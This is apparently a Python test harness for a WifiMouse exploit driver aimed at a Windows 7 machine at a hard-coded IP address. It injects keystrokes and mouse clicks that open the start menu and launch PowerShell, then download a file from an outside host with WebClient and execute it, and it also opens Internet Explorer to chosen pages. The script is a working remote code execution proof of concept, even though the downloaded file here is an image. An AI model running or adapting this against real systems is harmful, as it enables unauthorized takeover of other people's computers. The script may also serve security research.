import sys
from wifimouse_driver import WifiMouseDriver as driver
from time import sleep

IP = '18.250.7.143'

"""
Tests the WifiMouse exploit driver by:
    - opening the Windows start menu
    - opening Yahoo in the primary web browser

The tests are meant to be run on Windows 7.

When running the test, you can specify the IP address of the system to be
exploited as the first command-line parameter.
"""

def main():
    if len(sys.argv) >= 2:
        ip = sys.argv[1]
    else:
        ip = IP

    r = driver(ip)

    tests = [test_powershell,
             test_open_url,
             test_ping]

    for run in tests:
        clean_environment(r)
        run(r)
        sleep(3)

    r.close()

def clean_environment(r):
    r.move_mouse(-2000,-2000)

"""
Demonstrates that we can both open an arbitrary page in the default browser and
use the browser itself by navigating to another page. F4 shortcut is IE-specific.
"""
def test_open_url(r):
    open_url("http://www.yahoo.com/\n", r)
    sleep(1.5)
    r.press_action_key("F4")
    sleep(0.2)
    r.type("www.google.com\n")
    r.press_action_key('ENTER')

"""
Demonstrates that we can download an arbitrary file from the Internet and
execute it.
"""
def test_powershell(r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.type('powershell\n')
    r.press_action_key('ENTER')
    sleep(4)
    r.type('$c = new-object System.Net.WebClient\n') \
     .type('$c.DownloadFile("http://mit.edu/img/BackImage.jpg","Desktop\\BackImage.jpg")\n') \
     .type('.\\Desktop\\BackImage.jpg\n')

def test_ping(r):
    r.left_click()
    sleep(10)

def open_url(website, r):
    r.move_mouse(-2000,2000).left_click()
    sleep(0.5)
    r.type('Internet Explorer')
    r.press_action_key("ENTER")
    r.press_action_key("F4")
    r.type(website)
    r.press_action_key("ENTER")

if __name__ == "__main__":
    main()
